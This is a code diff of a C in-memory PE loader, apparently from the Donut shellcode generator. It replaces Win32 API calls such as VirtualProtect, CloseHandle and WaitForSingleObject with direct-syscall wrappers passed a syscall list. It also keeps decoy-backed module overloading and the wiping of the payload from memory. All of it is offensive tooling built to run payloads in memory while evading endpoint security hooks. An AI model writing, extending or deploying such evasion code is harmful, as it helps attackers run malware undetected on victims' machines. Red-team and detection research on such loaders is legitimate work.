@@ -95,6 +95,11 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
     PVOID                       cs = NULL;
     SIZE_T                      viewSize = 0;
     BOOL                        has_reloc;
+    PSYSCALL_LIST               syscall_list;
+    PVOID                       ba;
+    SIZE_T                      rs;
+    
+    syscall_list = (PSYSCALL_LIST)(ULONG_PTR)inst->syscall_list;
     
     base = mod->data;
     dos  = (PIMAGE_DOS_HEADER)base;
@@ -133,9 +138,9 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
     DPRINT("Creating section to store PE.");
     DPRINT("Requesting section size: %d", nt->OptionalHeader.SizeOfImage);
     if (inst->decoy[0] == 0) {
-      status = inst->api.NtCreateSection(&hSection, SECTION_ALL_ACCESS, 0, &liSectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+      status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, 0, &liSectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL, syscall_list);
       DPRINT("NTSTATUS: %d", status);
-      if(status != 0) return;
+      if(!NT_SUCCESS(status)) return;
     } else {
       DPRINT("Decoy file path: %s", inst->decoy);
       // implement module overloading by creating a MEM_IMAGE section backed by the decoy file
@@ -177,22 +182,22 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
         return;
       }      
         
-      status = inst->api.NtCreateSection(&hSection, SECTION_ALL_ACCESS, 0, NULL, PAGE_READONLY, SEC_IMAGE, hDecoy);
+      status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, 0, NULL, PAGE_READONLY, SEC_IMAGE, hDecoy, syscall_list);
 
-      inst->api.CloseHandle(hDecoy);
+      NtClose(hDecoy, syscall_list);
 
       DPRINT("NTSTATUS: %d", status);
-      if(status != 0) return;
+      if(!NT_SUCCESS(status)) return;
     }
     
     DPRINT("Mapping local view of section to store PE.");
-    status = inst->api.NtMapViewOfSection(hSection, inst->api.GetCurrentProcess(), &cs, 0, 0, 0, &viewSize, ViewUnmap, 0, PAGE_READWRITE);
+    status = NtMapViewOfSection(hSection, NtCurrentProcess(), &cs, 0, 0, 0, &viewSize, ViewUnmap, 0, PAGE_READWRITE, syscall_list);
     DPRINT("View size: %lld", viewSize);
 
     ntnew = RVA2VA(PIMAGE_NT_HEADERS, cs, dos->e_lfanew);
 
     DPRINT("NTSTATUS: %d", status);
-    if(status != 0 && status != 0x40000003) return;
+    if(!NT_SUCCESS(status) && status != 0x40000003) return;
 
     DPRINT("Mapped to address: %p", cs);
     
@@ -201,7 +206,8 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
     if (inst->decoy[0] != 0) 
     {
       // if module overloading, set everything to RW because they will start out otherwise
-      inst->api.VirtualProtect(cs, viewSize, PAGE_READWRITE, &oldprot);
+      ba = cs; rs = viewSize;
+      NtProtectVirtualMemory(NtCurrentProcess(), &ba, &rs, PAGE_READWRITE, &oldprot, syscall_list);
 
       DPRINT("Making copy of decoy module's headers for later use.");
 
@@ -403,9 +409,9 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
 
     if (inst->decoy[0] == 0) {
       DPRINT("Unmapping temporary local view of section to persist changes.");
-      status = inst->api.NtUnmapViewOfSection(inst->api.GetCurrentProcess(), cs);
+      status = NtUnmapViewOfSection(NtCurrentProcess(), cs, syscall_list);
       DPRINT("NTSTATUS: %d", status);
-      if(status != 0) return;
+      if(!NT_SUCCESS(status)) return;
 
       // if no reloc information is present, make sure we use the preferred address
       if (has_reloc) {
@@ -415,10 +421,10 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
       viewSize = 0;
 
       DPRINT("Mapping writecopy local view of section to execute PE.");
-      status = inst->api.NtMapViewOfSection(hSection, inst->api.GetCurrentProcess(), &cs, 0, 0, 0, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_WRITECOPY);
+      status = NtMapViewOfSection(hSection, NtCurrentProcess(), &cs, 0, 0, 0, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_WRITECOPY, syscall_list);
       DPRINT("View size: %lld", viewSize);
       DPRINT("NTSTATUS: %d", status);
-      if(status != 0) return;
+      if(!NT_SUCCESS(status)) return;
 
       DPRINT("Mapped to address: %p", cs);
     }
@@ -426,7 +432,8 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
     // start everything out as WC
     // this is because some sections are padded and you can end up with extra RWX memory if you don't pre-mark the padding as WC
     DPRINT("Pre-marking module as WC to avoid padding between PE sections staying RWX.")
-    inst->api.VirtualProtect(cs, viewSize, PAGE_WRITECOPY, &oldprot);
+    ba = cs; rs = viewSize;
+    NtProtectVirtualMemory(NtCurrentProcess(), &ba, &rs, PAGE_WRITECOPY, &oldprot, syscall_list);
 
     DPRINT("Setting permissions for each PE section");
     // done with binary manipulation, mark section permissions appropriately
@@ -467,15 +474,18 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
       DPRINT("Section size: 0x%llX", numBytes);
       DPRINT("Section protections: 0x%X", newprot);
       
-      if (!(inst->api.VirtualProtect(baseAddress, numBytes, newprot, &oldprot)))
-        DPRINT("VirtualProtect failed: %d", inst->api.GetLastError());
+      ba = baseAddress; rs = numBytes;
+      status = NtProtectVirtualMemory(NtCurrentProcess(), &ba, &rs, newprot, &oldprot, syscall_list);
+      if (!NT_SUCCESS(status))
+        DPRINT("NtProtectVirtualMemory failed: 0x%x", status);
     }
 
     // declare variables and set permissions of module header
     DPRINT("Setting permissions of module headers to READONLY (%d bytes)", ntc.OptionalHeader.BaseOfCode);
     oldprot = 0;
 
-    inst->api.VirtualProtect(cs, ntc.OptionalHeader.BaseOfCode, PAGE_READONLY, &oldprot);
+    ba = cs; rs = ntc.OptionalHeader.BaseOfCode;
+    NtProtectVirtualMemory(NtCurrentProcess(), &ba, &rs, PAGE_READONLY, &oldprot, syscall_list);
 
     /** 
       Execute TLS callbacks. These are only called when the process starts, not when a thread begins, ends
@@ -578,7 +588,7 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
         
         if(hThread != NULL) {
           // wait for thread to terminate
-          inst->api.WaitForSingleObject(hThread, INFINITE);
+          NtWaitForSingleObject(hThread, FALSE, NULL, syscall_list);
           DPRINT("Process terminated");
         }
       } else {
@@ -607,8 +617,8 @@ pe_cleanup:
       if (origmod != NULL)
         inst->api.VirtualFree(origmod, ntc.OptionalHeader.SizeOfHeaders, MEM_RELEASE | MEM_DECOMMIT);
       
-      inst->api.NtUnmapViewOfSection(inst->api.GetCurrentProcess(), cs);
-      inst->api.CloseHandle(hSection);
+      NtUnmapViewOfSection(NtCurrentProcess(), cs, syscall_list);
+      NtClose(hSection, syscall_list);
     }
 
     DPRINT("Wiping payload from Donut module in memory.");
@@ -642,13 +652,17 @@ BOOL IsExitAPI(PDONUT_INSTANCE inst, PCHAR name) {
 // returns TRUE if ptr is heap memory
 BOOL IsHeapPtr(PDONUT_INSTANCE inst, LPVOID ptr) {
     MEMORY_BASIC_INFORMATION mbi;
-    DWORD                    res;
+    NTSTATUS                 status;
+    SIZE_T                   ret_len;
+    PSYSCALL_LIST            syscall_list;
     
     if(ptr == NULL) return FALSE;
     
+    syscall_list = (PSYSCALL_LIST)(ULONG_PTR)inst->syscall_list;
+    
     // query the pointer
-    res = inst->api.VirtualQuery(ptr, &mbi, sizeof(mbi));
-    if(res != sizeof(mbi)) return FALSE;
+    status = NtQueryVirtualMemory(NtCurrentProcess(), ptr, 0 /* MemoryBasicInformation */, &mbi, sizeof(mbi), &ret_len, syscall_list);
+    if(!NT_SUCCESS(status) || ret_len != sizeof(mbi)) return FALSE;
 
     return ((mbi.State   == MEM_COMMIT    ) &&
             (mbi.Type    == MEM_PRIVATE   ) && 
